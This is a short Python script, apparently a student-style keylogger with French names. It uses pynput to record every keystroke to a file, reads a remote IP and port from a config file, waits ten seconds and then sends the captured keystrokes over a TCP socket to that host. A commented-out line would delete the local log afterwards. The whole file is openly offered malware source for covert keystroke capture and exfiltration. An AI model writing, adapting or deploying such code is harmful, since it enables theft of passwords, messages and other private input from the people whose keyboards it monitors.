import socket
import os
import time
import threading
from pynput.keyboard import Key, Listener
import logging
  
fin = False

def read_config_file(filename):
    with open(filename, 'r') as file:
        for line in file:
            if line.startswith("ip :"):
                ip = line.split(":")[1].strip()
            elif line.startswith("port :"):
                port = line.split(":")[1].strip()
            if ip and port:
                break
    return ip, port

def on_press(key):
    logging.info(str(key))
 
def tracing(): 
    if not fin:
        logging.basicConfig(filename=("keylogs.txt"),filemode='w' ,
                            format='%(asctime)s: %(levelname)s: %(message)s',level=logging.DEBUG)

        Listener(on_press=on_press).start()

def send_file(filename, server_address, server_port):
    with open(filename, 'rb') as file:
        file_data = file.read()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_address, server_port))
        s.sendall(file_data)

def minuteur(dead):
    global fin

    i = 0
    while i < dead :
        print(i)
        time.sleep(1)
        i+=1
        # a = input("press 'a' pour redemarer le minuteur")
        # if a == 'a':
        #     i=0
        # elif a =='b':
        #     fin = True
        #     break
   
ip_value, port_value = read_config_file('config.txt')    
threading.Thread(target=tracing,daemon=True).start()
filename = "keylogs.txt" 
server_address = ip_value
server_port = port_value
minuteur(10)
send_file(filename, server_address, server_port)
#os.remove(filename)
fin = True